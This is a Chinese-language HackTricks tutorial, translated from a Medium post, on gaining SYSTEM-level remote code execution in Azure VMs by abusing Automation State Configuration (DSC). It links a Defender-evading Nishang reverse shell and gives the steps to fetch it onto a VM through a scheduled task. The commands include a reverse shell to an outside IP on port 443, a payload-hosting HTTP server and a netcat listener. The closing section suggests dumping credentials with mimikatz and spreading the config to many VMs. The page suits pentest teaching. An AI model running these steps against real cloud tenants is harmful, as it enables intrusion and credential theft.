# Az - 状态配置远程代码执行

<details>

<summary><strong>支持 HackTricks 并获得福利！</strong></summary>

* 如果您想在 HackTricks 中看到您的公司广告，或者如果您想访问 PEASS 的最新版本或下载 HackTricks 的 PDF，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS 和 HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 仓库提交 PR 来分享您的黑客技巧。**

</details>

**此帖子的内容来自** [**https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe**](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)

### 远程服务器（C2）基础设施准备 <a href="#f0fa" id="f0fa"></a>

我将在远程服务器“40.84.7.74”上托管一个精简版的 Nishang Invoke-PowerShellTcp.ps1 负载，负载名称为“RevPS.ps1”。为了防止 Nishang 脚本因任何原因被 Windows Defender 删除（也许您更愿意将文件放到磁盘上），我在这里提供了一个轻量级版本，可以绕过 Defender：[https://github.com/nickpupp0/AzureDSCAbuse/blob/master/RevPS.ps1](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/RevPS.ps1)。这将由 Kali 系统上的简单 Python 服务器托管。

### 步骤 1 — 创建文件 <a href="#89de" id="89de"></a>

我们需要创建另一个 DSC 配置文件。可以在此处下载模板：[https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse\_shell\_config.ps1](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse\_shell\_config.ps1)。此配置文件将使用与之前相同的文件写入函数。这次，内容包括从我们的远程服务器下载和执行负载的代码。此外，我们使用了 _ComputerManagementDsc_ 模块中可用的计划任务函数。计划任务函数将在执行时起到关键作用，并为我们提供 SYSTEM 权限。

我们还将下载一个脚本，用于将配置发布到虚拟机。该脚本位于此处：[https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push\_reverse\_shell\_config.ps1](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push\_reverse\_shell\_config.ps1)。

这些文件将作为模板。**您需要使用您正在使用的变量名和参数填写**。这包括资源名称、文件路径和您正在使用的外部服务器/负载名称。请参考代码中的注释。

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 步骤 2 — 压缩配置文件 <a href="#c2c2" id="c2c2"></a>

创建好我们的两个文件后，我们将压缩**'reverse\_shell\_config.ps1'**文件，以便将其发送到存储帐户中。
```
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
<figure><img src="../../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

### 步骤 3 — 设置存储上下文并上传 <a href="#bed9" id="bed9"></a>

同样，我们将设置存储帐户的上下文，我已经完成了这一步。我已经有一个名为 '**azure-pentes**t' 的容器，所以我将在这里发布我的文件：
```
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
<figure><img src="../../../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>

### 第四步 — 准备 Kali Box <a href="#20fb" id="20fb"></a>

在我们的 Kali Box 中，我们可以简单地使用 _wget_ 下载我们的 PowerShell 负载。原始的反向 shell 脚本位于这里：[https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1](https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1)。
```
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
<figure><img src="../../../../.gitbook/assets/image (8) (2).png" alt=""><figcaption></figcaption></figure>

我们需要编辑反向Shell脚本，通过添加我们的参数，让Windows虚拟机在执行时知道要连接到哪里。在我的情况下，我添加了以下内容：
```
RevPShell -Reverse 40.84.7.73 443
```
<figure><img src="../../../../.gitbook/assets/image (2) (3).png" alt=""><figcaption></figcaption></figure>

### 第5步 — 发布配置文件 <a href="#9ad6" id="9ad6"></a>

现在我们将运行我们的配置文件。我已经设置了将其发布到桌面以获得更好的可视效果，但它可以发布到任何地方。几分钟后，我们将看到反向shell脚本已经被发布了！

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 第6步 — 托管有效载荷并设置监听器 <a href="#c55f" id="c55f"></a>

一旦我们发布了配置文件，我们可以同时启动一个Python SimpleHTTPServer在端口80上托管有效载荷，以及一个netcat监听器来捕获连接：
```
sudo python -m SimpleHTTPServer 80sudo nc -nlvp 443
```
我们看到计划任务已经运行，并且我们的载荷已经以**SYSTEM**级别权限在内存中被检索和执行！

<figure><img src="../../../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

### 总结 <a href="#1ec2" id="1ec2"></a>

这现在为许多可能性打开了大门。由于我们有一个以**SYSTEM**身份运行的shell，我们可以使用mimikatz来转储凭据（根据云资源的EDR成熟程度可能存在风险）。如果你转储凭据，很有可能可以在不同资源之间重复使用它们。最后，一个重要的收获是，你现在可以将此配置潜在地应用于多个虚拟机，而不仅仅限于一个虚拟机。

在此结束我们的Azure Automation DSC冒险！希望你玩得开心，学到了很多，并继续发挥自己的创造力。

<details>

<summary><strong>支持HackTricks并获得福利！</strong></summary>

* 如果你想看到你的**公司在HackTricks中被广告**，或者如果你想访问**PEASS的最新版本或下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的动态 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享你的黑客技巧。**

</details>
